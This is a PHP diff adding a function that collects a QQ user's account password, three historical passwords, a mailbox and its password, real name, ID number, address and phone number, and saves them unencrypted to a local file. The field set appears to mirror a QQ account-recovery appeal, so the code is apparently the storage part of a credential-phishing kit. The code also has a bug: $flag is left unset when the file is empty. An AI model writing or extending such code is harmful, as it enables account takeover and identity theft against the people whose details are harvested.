@@ -81,4 +81,36 @@ function getQQNick($qq){
 	return $nickname[$qq][6];
 }
 
+function writeDetail($qq,$trueName,$addr,$anotherQQ,$password,$reciveType,$reciveMail,$reciveMailPassword,$historyPw1,$historyPw2,$historyPw3,$trueName1,$certificateType,$certificateNumber,$phoneNumber,$other){
+	$detailList=getDetail();
+	$detailList=json_decode($detailList,true);
+	$index=0;
+	$detailInfo="真实姓名:$trueName;详细地址:$addr;另一个QQ:$anotherQQ;密码:$password;结果接收方式:$reciveType;接收结果的邮箱:$reciveMail;接收结果的邮箱密码:$reciveMailPassword;历史密码1:$historyPw1;历史密码2:$historyPw2;历史密码3:$historyPw3;真实姓名2:$trueName1;身份证类型:$certificateType;身份证号码:$certificateNumber;手机号码:$phoneNumber;备注:$other";
+	
+	if($detailList==null){
+		$detailList=array();
+		array_push($detailList,array("qq"=>$qq,"detail"=>$detailInfo));
+	}else{
+		foreach ($detailList as $key => $value) {
+			$flag=0;
+			if($value['qq']==$qq){
+				$flag++;
+				$index=$key;
+				break;
+			}
+		}
+	}
+	if($flag<=0){
+		array_push($detailList,array("qq"=>$qq,"detail"=>$detailInfo));
+	}else{
+		$detailList[$index]['detail']=$detailInfo;
+	}
+
+	file_put_contents("detail.dbk",json_encode($detailList));
+}
+
+function getDetail(){
+	return file_get_contents("detail.dbk");
+}
+
 ?>
